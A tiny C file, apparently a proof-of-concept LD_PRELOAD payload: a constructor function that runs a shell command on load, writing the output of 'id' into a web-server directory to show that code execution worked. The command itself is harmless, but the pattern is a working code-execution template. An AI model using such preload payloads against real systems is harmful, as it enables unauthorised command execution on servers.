// test.c

#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
__attribute__ ((__constructor__)) void preload (void)
{
    system("id > /var/www/html/test6666666666.txt");
}